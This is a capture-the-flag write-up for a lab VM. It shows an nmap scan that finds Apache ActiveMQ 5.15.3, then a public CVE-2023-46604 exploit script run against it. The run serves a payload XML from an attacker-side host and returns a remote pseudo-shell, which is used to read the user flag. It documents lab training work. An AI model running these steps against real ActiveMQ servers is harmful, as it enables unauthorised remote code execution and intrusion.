## Prime Time (user)

### Challenge

We were given an IP address of a VM.

Nmap scan:
```
# Nmap 7.94SVN scan initiated Sat Nov  2 12:46:58 2024 as: nmap -sC -sV -T5 -p- -oA nmap/scanresult 10.128.3.85
Warning: 10.128.3.85 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.128.3.85
Host is up (0.082s latency).
Not shown: 65527 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 14:3e:0f:f2:8b:a9:6d:4e:a9:07:76:0f:ba:89:92:05 (RSA)
|   256 e4:4b:42:a9:72:39:88:fa:01:31:3d:34:49:10:3c:d3 (ECDSA)
|_  256 f1:99:0c:0d:90:a4:1b:74:9f:e0:b5:95:40:6a:0e:e2 (ED25519)
1883/tcp  open  mqtt
| mqtt-subscribe:
|   Topics and their most recent payloads:
|     ActiveMQ/Advisory/MasterBroker:
|_    ActiveMQ/Advisory/Consumer/Topic/#:
5672/tcp  open  amqp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie:
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
8161/tcp  open  http       Jetty 9.2.22.v20170606
|_http-server-header: Jetty(9.2.22.v20170606)
|_http-title: Apache ActiveMQ
35477/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings:
|   HELP4STOMP:
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:269)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.2.22.v20170606
|_http-title: Site doesn't have a title.
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.2.22.v20170606)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings:
|   NULL:
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion
|_    5.15.3
```

The nmap scan shows that ActiveMQ version `5.15.3` is running on port `61616`. This version is vulnerable for CVE-2023-46604.

By using one of many public exploit scripts on GitHub. We got a shell and could read the user flag located in `/home/activemq/user.txt`

```
$ python3 exploit.py -i 10.128.2.92 -p 61616  -si 10.128.1.1 -sp 8080
#################################################################################
#  CVE-2023-46604 - Apache ActiveMQ - Remote Code Execution - Pseudo Shell      #
#  Exploit by Ducksec, Original POC by X1r0z, Python POC by evkl1d              #
#################################################################################

[*] Target: 10.128.2.92:61616
[*] Serving XML at: http://10.128.1.1:8080/poc.xml
[!] This is a semi-interactive pseudo-shell, you cannot cd, but you can ls-lah / for example.
[*] Type 'exit' to quit

#################################################################################
# Not yet connected, send a command to test connection to host.                 #
# Prompt will change to Apache ActiveMQ$ once at least one response is received #
# Please note this is a one-off connection check, re-run the script if you      #
# want to re-check the connection.                                              #
#################################################################################

[Target not responding!]$ whoami
prime

Apache ActiveMQ$ ls /home
activemq
centos

Apache ActiveMQ$ ls /home/activemq
user.txt

Apache ActiveMQ$ cat /home/activemq/user.txt
EPT{d41d8cd98f00b204e9800998ecf8427e}


Apache ActiveMQ$
```